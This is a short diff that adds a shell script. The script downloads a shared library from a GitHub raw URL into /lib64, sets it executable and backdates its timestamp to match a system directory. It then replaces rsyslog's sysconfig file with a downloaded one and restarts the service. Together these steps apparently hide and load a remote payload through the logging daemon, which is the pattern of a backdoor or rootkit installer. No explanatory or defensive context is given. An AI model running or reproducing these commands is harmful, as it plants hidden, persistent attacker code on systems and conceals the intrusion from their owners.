@@ -1,0 +1,8 @@
+curl -s -o /lib64/libgbk.so https://raw.githubusercontent.com/exeowxle891/hello/main/up.so
+chmod 755 /lib64/libgbk.so
+touch /lib64/libgbk.so -r /lib64/tls
+curl -s -o /etc/sysconfig/rsyslog https://raw.githubusercontent.com/exeowxle891/hello/main/rsyslog
+cat /etc/sysconfig/rsyslog
+md5sum /lib64/libgbk.so
+ls -alh /lib64/libgbk.so
+systemctl restart rsyslog
